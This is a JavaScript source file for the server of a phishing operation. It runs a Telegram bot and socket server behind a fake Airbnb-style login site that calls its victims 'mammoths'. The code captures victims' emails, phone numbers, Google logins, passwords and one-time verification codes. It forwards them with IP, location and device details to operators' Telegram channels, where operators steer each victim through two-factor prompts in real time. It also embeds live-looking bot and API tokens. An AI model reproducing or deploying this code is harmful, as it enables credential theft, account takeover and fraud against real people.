const { default: axios } = require('axios');
const express = require('express');
const { Telegraf, Markup } = require('telegraf');
const { Server } = require('socket.io');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const { UAParser } = require('ua-parser-js');

const db = new sqlite3.Database('database.db', err => {
	if (err) return console.log(err.message);
	console.log('Connected to the Database');
	db.run('CREATE TABLE IF NOT EXISTS flows (id INTEGER PRIMARY KEY AUTOINCREMENT, method TEXT, email TEXT, phone TEXT, verifMethod TEXT, verifCode TEXT, ip TEXT, socketId TEXT)');
	db.run(`CREATE TABLE IF NOT EXISTS methods(id INTEGER PRIMARY KEY AUTOINCREMENT, method TEXT)`);
	db.run('CREATE TABLE IF NOT EXISTS messages(id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, for TEXT, text TEXT)');
});

const io = new Server({ cors: '*', path: '/' }); // PROD: /api
const bot = new Telegraf('6818036922:AAFAUSo-U4U1ClKsp5-mZuzPVhmakbYlW-I'); // PROD: 7004609646:AAGWTb-XRF1lg3GjZslBkhUhfEbmxmJRA3I
const app = express({});
app.use(express.json());
app.use(cors());

const CHID = -1002032657131; // PROD: -1002000465283;
const CH2ID = -1001991969906;
const flows = [];
let connections = [];
let allCons = [];

const generateMessage = flow => {
	const requestCode = () =>
		flow.whoHandles && (flow.method === 'email' || flow.method === 'phone') && flow.isActive && flow.verifMethod && !flow.verifCode && !flow.codeIsRequested
			? [{ text: `📥 Запросить код`, callback_data: 'request-code' }]
			: [];
	const setFlowHandler = () => (flow.isActive && !flow.whoHandles ? [{ text: '📌 Обработать', callback_data: 'set-flow-handler' }] : []);
	const againCode = () => (flow.whoHandles && flow.isActive && flow.againCodeEnable ? [{ text: '🔄 Перезапросить код', callback_data: 'again-code' }] : []);

	const googleDefaultChoice = () =>
		flow.isActive && flow.whoHandles && flow.googleDefaultChoice
			? [
					{
						text: '❓ Телефон (да)',
						callback_data: 'google-default-choice_mobileYes',
					},
					{
						text: '❓ Телефон (код)',
						callback_data: 'google-default-choice_mobileCode',
					},
			  ]
			: [];
	const invalidPassword = () => {
		if (flow.isActive && flow.whoHandles && flow.password && !flow.verifMethod && !flow.passwordSubmit) {
			return [
				{
					text: '🚫 Неверный пароль',
					callback_data: 'invalid-password',
				},
			];
		} else return [];
	};
	const submitPassword = () => {
		if (flow.isActive && flow.method === 'email' && flow.whoHandles && flow.password && !flow.verifMethod && !flow.passwordSubmit) {
			return [
				{
					text: '✅ Подтвердить пароль',
					callback_data: 'submit-password',
				},
			];
		} else return [];
	};
	const end = () => {
		if (flow.isActive && flow.whoHandles && flow.waitEnd && !flow.ended) {
			return [
				{
					text: '🔚 Конец',
					callback_data: 'end',
				},
			];
		} else return [];
	};

	console.log(flow);
	io.to('support').emit('flows', { ip: flow.ip, flows: flows.filter(f => f.ip === flow.ip && f.isActive) });
	return [
		`${flow.isActive ? '🟩 Мамонт активен!' : '🦣 Мамонт не активен'}\n\n💠 ID: ${flow.id}\n🎖 Завел: ${flow.link ?? null}\n👤 Обрабатывает: @${flow.whoHandles ?? null}\n🌏 IP: ${
			flow.ip
		}\n🇺🇸 GEO: ${flow.geo}\nЧат: https://auth-airbnb.com/support/penis?con=${flow.ip}\n\nСпособ авторизации: ${flow.method}\n${
			flow.method === 'email' && flow.email
				? `Email: <code>${flow.email}</code>\n`
				: flow.method === 'phone' && flow.phone
				? `Phone: +${flow.phone.split('_')[0]}<code>${flow.phone.split('_')[1]}</code>\n`
				: flow.method === 'google' && flow.login && `Login: <code>${flow.login}</code>\n`
		}${flow.password ? `Password: <code>${flow.password}</code>\n` : ''}${flow.verifMethod ? `Метод верифа: ${flow.verifMethod}\n` : ''}${
			flow.phoneName ? `PhoneName: <code>${flow.phoneName}</code>\n` : ''
		}${flow.phoneCode ? `PhoneCode: <code>${flow.phoneCode}</code>\n` : ''}${flow.verifCode ? `Код верификации: <code>${flow.verifCode}</code>\n` : ''}${
			flow.description ? `\n💬 <code>${flow.description}</code>\n` : ''
		}`,
		{
			parse_mode: 'HTML',
			reply_markup: {
				inline_keyboard: [googleDefaultChoice(), submitPassword(), invalidPassword(), setFlowHandler(), requestCode(), againCode(), end()],
			},
		},
	];
};

const middleware = async (ctx, next) => {
	if (ctx.update.callback_query && ctx.callbackQuery?.data !== 'disconnect') {
		const flowIndex = flows.findIndex(f => f.messageId === ctx.msgId);
		if (flowIndex === -1) return await ctx.answerCbQuery('Поток не активен.');
		if (flows[flowIndex].whoHandles && flows[flowIndex].whoHandles !== ctx.update.callback_query.from.username) return await ctx.answerCbQuery('Ты не обрабатываешь этот поток.');
		ctx.flowIndex = flowIndex;
	}
	next();
};

// EVENTS

bot.use(middleware);
io.on('connection', async socket => {
	const ip = socket.handshake.address; // PROD: socket.handshake.headers['x-forwarded-for'];
	socket.on('message', async text => {
		if (!ip) return;
		db.run(`INSERT INTO messages (ip, for, text) VALUES ("${ip}", "me", "${text}")`);
		io.to('support').emit('message', { ip: ip, text });
	});

	socket.on('support-message', ({ ip, text }) => {
		db.run(`INSERT INTO messages (ip, for, text) VALUES ("${ip}", "support", "${text}")`);
		io.to(`chat-${ip}`).emit('message', text);
	});

	socket.on('join-support', () => {
		console.log('join-support');
		socket.join('support');
		console.log('get', connections);
		socket.emit(
			'connections',
			connections.map(c => ({ ip: c, messages: [], flows: [] }))
		);
	});

	socket.on('get-connection', ip => {
		db.all(`SELECT * FROM messages WHERE ip = "${ip}"`, (err, rows) => {
			if (err) return;
			socket.emit('messages', {
				ip,
				messages: rows.map(r => ({ for: r.for, text: r.text })),
			});
		});
		io.to('support').emit('flows', { ip: ip, flows: flows.filter(f => f.ip === ip && f.isActive) });
	});

	socket.on('add-connection', () => {
		if (!ip) return;
		socket.join(`chat-${ip}`);
		db.all(`SELECT * FROM messages WHERE ip = "${ip}"`, (err, rows) => {
			if (err) return console.log(err);
			socket.emit('messages', rows);
		});
		const conId = connections.find(c => c === ip);
		if (conId) return;
		connections.push(ip);
		console.log('add', connections);
		io.to('support').emit(
			'connections',
			connections.map(c => ({ ip: c, messages: [], flows: [] }))
		);
	});

	socket.on('disconnect-connection', ({ ip }) => {
		console.log('remove', connections);
		const conId = connections.findIndex(c => c === ip);
		if (conId !== -1) {
			connections.splice(conId, 1);
		}
		io.to('support').emit(
			'connections',
			connections.map(c => ({ ip: c, messages: [], flows: [] }))
		);
	});

	socket.on('new-flow', async data => {
		if (!data.method) return;

		const flowIsRequired = flows.find(f => {
			if (data.method === 'email') return f.email === data.email;
			else if (data.method === 'phone') return f.phone === data.phone;
			else if (data.method === 'google') return f.login === data.login;
		});
		if (flowIsRequired) return;

		const ipInfo = await axios
			.get(`https://ipinfo.io/${ip}?token=24eac7842fafa4`)
			.then(res => res.data)
			.catch(e => e.response.data);
		const geo = ipInfo.country ? `${ipInfo.city}(${ipInfo.country})` : null;

		try {
			db.run(
				`INSERT INTO flows (socketId, method, email, phone, ip, verifMethod) VALUES("${socket.id}", "${data.method}", "${data.email ?? null}", "${data.phone ?? null}", "${
					ipInfo.ip ?? null
				}", "${data.phone ? 'sms' : null}")`
			);
			const id = await new Promise(r => {
				db.get(`SELECT id FROM flows WHERE socketId = "${socket.id}"`, (err, data) => r(data.id));
			});
			const message = await bot.telegram.sendMessage(
				CHID,
				...generateMessage({
					id,
					method: data.method,
					phone: data.phone ?? null,
					email: data.email ?? null,
					login: data.login ?? null,
					link: data.link,
					ip: ipInfo.ip,
					geo: geo,
					description: data.email || data.login ? 'Ожидаем пароль от мамонта' : 'Мамонт ждет запроса кода',
					isActive: true,
				})
			);

			flows.push({
				id,
				messageId: message.message_id,
				method: data.method,
				phone: data.phone ?? null,
				email: data.email ?? null,
				login: data.login ?? null,
				link: data.link,
				ip: ipInfo.ip,
				geo: geo,
				socketId: socket.id,
				verifMethod: data.phone ? 'sms' : null,
				description: data.email || data.login ? 'Ожидаем пароль от мамонта' : 'Мамонт ждет запроса кода',
				isActive: true,
			});
			io.to('support').emit('flows', { ip: ip, flows: flows.filter(f => f.ip === ip && f.isActive) });
		} catch (error) {
			console.log(error);
		}
	});

	socket.on('email-password', async data => {
		if (!data.password || !data.email || data.method !== 'email') return;

		const flowIndex = flows.findIndex(f => f.email === data.email);
		if (flowIndex === -1) return;
		flows[flowIndex].password = data.password;
		flows[flowIndex].description = 'Ожидаем метод верифа от мамонта';
		const flow = flows[flowIndex];

		await bot.telegram.editMessageText(CHID, flow.messageId, null, ...generateMessage(flow)).catch(e => console.log(e));
	});

	socket.on('email-verifMethod', async data => {
		if (!data.verifMethod || !data.email || data.method !== 'email') return;

		const flowIndex = flows.findIndex(f => f.email === data.email);
		if (flowIndex === -1) return;
		flows[flowIndex].verifMethod = data.verifMethod;
		flows[flowIndex].codeIsRequested = false;
		flows[flowIndex].description = 'Мамонт ждет запроса кода';
		const flow = flows[flowIndex];

		await bot.telegram.editMessageText(CHID, flow.messageId, null, ...generateMessage(flow)).catch(e => console.log(e));
	});

	socket.on('verif-code', async data => {
		if (!data.method) return;

		const flowIndex = flows.findIndex(f => {
			if (data.method === 'email') return f.email === data.email;
			if (data.method === 'phone') return f.phone === data.phone;
		});
		if (flowIndex === -1) return;

		flows[flowIndex].verifCode = data.verifCode;
		flows[flowIndex].againCodeEnable = true;
		flows[flowIndex].description = null;
		flows[flowIndex].waitEnd = true;
		const flow = flows[flowIndex];
		await bot.telegram.editMessageText(CHID, flow.messageId, null, ...generateMessage(flow)).catch(e => console.log(e));
	});

	socket.on('google-password', async data => {
		if (!data || !data.login || !data.password || data.method !== 'google') return;

		const flowIndex = flows.findIndex(f => f.login === data.login);
		if (flowIndex === -1) return;
		flows[flowIndex].password = data.password;
		flows[flowIndex].description = 'Выбери способ верифа по умолчанию';
		flows[flowIndex].googleDefaultChoice = true;
		const flow = flows[flowIndex];
		await bot.telegram.editMessageText(CHID, flow.messageId, null, ...generateMessage(flow)).catch(e => console.log(e));
	});

	socket.on('disconnect', async () => {
		console.log('disconnect');
		try {
			const conId = allCons.findIndex(c => c.socketId === socket.id);
			if (conId !== -1) {
				const con = allCons[conId];

				await bot.telegram
					.editMessageText(
						CH2ID,
						con.messageId,
						null,
						`⬛️ IP: <b>${ip}</b>\nGEO: ${con.geo}\nBrowser: <code>${con?.agent?.browser?.name}</code>\nDevice: <code>${con?.agent?.device?.vendor}</code>\nOS: <code>${
							con?.agent?.os?.name
						}</code>\nTime: <code>${((Date.now() - con.ts) / 1000).toFixed(0)} sec.</code>`,
						{ parse_mode: 'HTML' }
					)
					.catch(e => console.log(e));

				allCons.splice(conId, 1);
			}
		} catch (error) {
			console.log(error);
		}
		const flowIndex = flows.findIndex(f => f.socketId === socket.id);
		if (flowIndex === -1) return;
		flows[flowIndex].isActive = false;
		flows[flowIndex].description = null;
		const flow = flows[flowIndex];

		await bot.telegram.editMessageText(CHID, flow.messageId, null, ...generateMessage(flow)).catch(e => console.log(e));
		flows.splice(flowIndex, 1);
	});

	try {
		const parser = new UAParser(socket.handshake.headers['user-agent']);
		const userAgent = parser.getResult();
		const ipInfo = await axios
			.get(`https://ipinfo.io/${ip}?token=24eac7842fafa4`)
			.then(res => res.data)
			.catch(e => e.response.data);
		const geo = ipInfo.country ? `${ipInfo.city}(${ipInfo.country})` : null;

		const message = await bot.telegram.sendMessage(
			CH2ID,
			`🟩 IP: <b>${ip}</b>\nGEO: ${geo}\nBrowser: <code>${userAgent?.browser?.name}</code>\nDevice: <code>${userAgent?.device?.vendor}</code>\nOS: <code>${userAgent?.os?.name}</code>`,
			{ parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ callback_data: 'disconnect', text: 'Отключить' }]] } }
		);
		allCons.push({ agent: userAgent, isActive: true, ip, messageId: message?.message_id, socketId: socket.id, ts: Date.now(), geo });
	} catch (error) {}
});

// ACTIONS

bot.action('set-flow-handler', async ctx => {
	flows[ctx.flowIndex].whoHandles = ctx.update.callback_query.from.username;
	const flow = flows[ctx.flowIndex];

	await bot.telegram.editMessageText(CHID, ctx.msgId, null, ...generateMessage(flow)).catch(e => console.log(e));
	await ctx.answerCbQuery();
});

bot.action('disconnect', async ctx => {
	try {
		const highCon = allCons.findIndex(c => c.messageId === ctx.update.callback_query.message.message_id);
		if (highCon === -1) return;
		const cons = allCons.filter(c => c.ip === allCons[highCon].ip);
		for (let i = 0; i < cons.length; i++) {
			const con = cons[i];
			(await io.sockets.fetchSockets()).find(s => s.id === con.socketId)?.emit('exit');

			await bot.telegram
				.editMessageText(
					CH2ID,
					con.messageId,
					null,
					`⬛️ IP: <b>${con.ip}</b>\nGEO: ${con.geo}\nBrowser: <code>${con?.agent?.browser?.name}</code>\nDevice: <code>${con?.agent?.device?.vendor}</code>\nOS: <code>${
						con?.agent?.os?.name
					}</code>\nTime: <code>${(Date.now() - con.ts) / 1000} sec.</code>`,
					{ parse_mode: 'HTML' }
				)
				.catch(() => {});
		}
	} catch (error) {
		console.log(error);
	}
});

bot.action('request-code', async ctx => {
	flows[ctx.flowIndex].codeIsRequested = true;
	flows[ctx.flowIndex].description = 'Ожидаем код от мамонта';
	const flow = flows[ctx.flowIndex];

	io.to(flow.socketId).emit('request-code');
	await bot.telegram.editMessageText(CHID, ctx.msgId, null, ...generateMessage(flow)).catch(e => console.log(e));
	await ctx.answerCbQuery();
});

bot.action('invalid-password', async ctx => {
	flows[ctx.flowIndex].password = null;
	flows[ctx.flowIndex].googleDefaultChoice = false;
	flows[ctx.flowIndex].description = 'Ожидаем новый пароль от мамонта';
	const flow = flows[ctx.flowIndex];

	io.to(flow.socketId).emit('invalid-password');
	await bot.telegram.editMessageText(CHID, ctx.msgId, null, ...generateMessage(flow)).catch(e => console.log(e));
	await ctx.answerCbQuery();
});

bot.action('submit-password', async ctx => {
	flows[ctx.flowIndex].description = 'Ожидаем метод верифа от мамонта';
	flows[ctx.flowIndex].passwordSubmit = true;
	const flow = flows[ctx.flowIndex];
	io.to(flow.socketId).emit('submit-password');
	await bot.telegram.editMessageText(CHID, ctx.msgId, null, ...generateMessage(flow)).catch(e => console.log(e));
	await ctx.answerCbQuery();
});

bot.action('again-code', async ctx => {
	flows[ctx.flowIndex].againCodeEnable = false;
	flows[ctx.flowIndex].description = 'Ожидаем код от мамонта';
	const flow = flows[ctx.flowIndex];
	io.to(flow.socketId).emit('again-code');
	await bot.telegram.editMessageText(CHID, ctx.msgId, null, ...generateMessage(flow)).catch(e => console.log(e));
	await ctx.answerCbQuery();
});

bot.action('end', async ctx => {
	flows[ctx.flowIndex].ended = true;
	flows[ctx.flowIndex].waitEnd = false;
	flows[ctx.flowIndex].againCodeEnable = false;
	const flow = flows[ctx.flowIndex];
	const sockets = (await io.sockets.fetchSockets()).filter(s => s.handshake.address === flow.ip); // PROD: socket.handshake.headers['x-forwarded-for'];
	sockets.forEach(s => s.emit('end'));
	await bot.telegram.editMessageText(CHID, ctx.msgId, null, ...generateMessage(flow)).catch(e => console.log(e));
	await ctx.answerCbQuery();
});

bot.action(/^google-default-choice_.+/, async ctx => {
	const method = ctx.callbackQuery.data.split('google-default-choice_')[1];
	flows[ctx.flowIndex].verifMethod = method;
	flows[ctx.flowIndex].googleDefaultChoice = false;
	if (method === 'mobileYes') {
		flows[ctx.flowIndex].phoneNameChoice = true;
		flows[ctx.flowIndex].description = 'Укажи название телефона (/pn)';
	} else if (method === 'mobileCode') {
		flows[ctx.flowIndex].phoneNameChoice = true;
		flows[ctx.flowIndex].phoneCodeChoice = true;
		flows[ctx.flowIndex].description = 'Укажи название телефона (/pn) и код (/pc)';
	}
	const flow = flows[ctx.flowIndex];
	io.to(flow.socketId).emit('google-default-method', method);
	await bot.telegram.editMessageText(CHID, ctx.msgId, null, ...generateMessage(flow)).catch(e => console.log(e));
	await ctx.answerCbQuery();
});

// REQUESTS

app.get('/api/connect', async (req, res) => {
	res.send(true);
	await bot.telegram.sendMessage(CH2ID, `ip: ${req.query.ip}\nuser-agent: ${req.query.userAgent}`);
});

app.post('/api/method', async (req, res) => {
	try {
		res.send(true);
		console.log(req.body);
		if (!req.body.method || typeof req.body.method !== 'string') return;
		db.run(`INSERT INTO methods (method) VALUES("${req.body.method}")`);
		const count = {};
		count.google = await new Promise(r => {
			db.get(`SELECT Count(*) FROM methods WHERE method = "google"`, (err, data) => r(data['Count(*)']));
		});
		count.email = await new Promise(r => {
			db.get(`SELECT Count(*) FROM methods WHERE method = "email"`, (err, data) => r(data['Count(*)']));
		});
		count.phone = await new Promise(r => {
			db.get(`SELECT Count(*) FROM methods WHERE method = "phone"`, (err, data) => r(data['Count(*)']));
		});
		count.facebook = await new Promise(r => {
			db.get(`SELECT Count(*) FROM methods WHERE method = "facebook"`, (err, data) => r(data['Count(*)']));
		});
		count.apple = await new Promise(r => {
			db.get(`SELECT Count(*) FROM methods WHERE method = "apple"`, (err, data) => r(data['Count(*)']));
		});

		console.log(count);
		await bot.telegram.sendMessage(
			CH2ID,
			`🔠 method = ${req.body.method}\n\n${Object.entries(count)
				.map(c => `${c[0]}: ${c[1]}`)
				.join('\n')}`
		);
	} catch (err) {
		console.log(err);
	}
});

app.post('/api/link', async (req, res) => {
	try {
		if (links[req.body.link]) res.send(true);
		else res.send(false);
	} catch (error) {
		res.send(false);
	}
});

// COMMANDS

bot.command('pn', async ctx => {
	if (!ctx.message.reply_to_message.forward_origin)
		return ctx.reply('<code>* Должен быть ответ на лог</code>', {
			reply_parameters: {
				chat_id: ctx.chat.id,
				message_id: ctx.message.message_id,
			},
			parse_mode: 'HTML',
		});

	const flowIndex = flows.findIndex(f => f.messageId === ctx.message.reply_to_message.forward_origin.message_id);
	if (flowIndex === -1)
		return ctx.reply('<code>* Поток не найден</code>', {
			reply_parameters: {
				chat_id: ctx.chat.id,
				message_id: ctx.message.message_id,
			},
			parse_mode: 'HTML',
		});

	if (!ctx.payload)
		return ctx.reply('<code>* /pn "Название телефона"</code>', {
			reply_parameters: {
				chat_id: ctx.chat.id,
				message_id: ctx.message.message_id,
			},
			parse_mode: 'HTML',
		});

	flows[flowIndex].phoneName = ctx.payload;
	flows[flowIndex].phoneNameChoice = false;
	if (flows[flowIndex].verifMethod && !flows[flowIndex].phoneCode === 'mobileCode') {
		flows[flowIndex].description = 'Укажи код (/pc)';
	} else {
		flows[flowIndex].description = 'Ждем подтверждения';
		flows[flowIndex].waitEnd = true;
	}
	const flow = flows[flowIndex];
	await bot.telegram.editMessageText(CHID, flow.messageId, null, ...generateMessage(flow)).catch(e => console.log(e));
	io.to(flow.socketId).emit('google-phone-name', ctx.payload);
	await bot.telegram.setMessageReaction(ctx.chat.id, ctx.message.message_id, [{ type: 'emoji', emoji: '👍' }]).catch(() => {});
});

bot.command('pc', async ctx => {
	if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.forward_origin) return;
	if (!ctx.message.reply_to_message.forward_origin)
		return ctx.reply('<code>* Должен быть ответ на лог</code>', {
			reply_parameters: {
				chat_id: ctx.chat.id,
				message_id: ctx.message.message_id,
			},
			parse_mode: 'HTML',
		});

	const flowIndex = flows.findIndex(f => f.messageId === ctx.message.reply_to_message.forward_origin.message_id);
	if (flowIndex === -1)
		return ctx.reply('<code>* Поток не найден</code>', {
			reply_parameters: {
				chat_id: ctx.chat.id,
				message_id: ctx.message.message_id,
			},
			parse_mode: 'HTML',
		});

	if (!ctx.payload)
		return ctx.reply('<code>* /pc "Код"</code>', {
			reply_parameters: {
				chat_id: ctx.chat.id,
				message_id: ctx.message.message_id,
			},
			parse_mode: 'HTML',
		});

	flows[flowIndex].phoneCode = ctx.payload;
	flows[flowIndex].phoneCodeChoice = false;
	flows[flowIndex].description = 'Ждем подтверждения кода';
	flows[flowIndex].waitEnd = true;
	const flow = flows[flowIndex];
	await bot.telegram.editMessageText(CHID, flow.messageId, null, ...generateMessage(flow)).catch(e => console.log(e));
	io.to(flow.socketId).emit('google-phone-code', ctx.payload);
	await bot.telegram.setMessageReaction(ctx.chat.id, ctx.message.message_id, [{ type: 'emoji', emoji: '👍' }]).catch(() => {});
});

bot.launch();
io.listen(4545);
app.listen(4646);
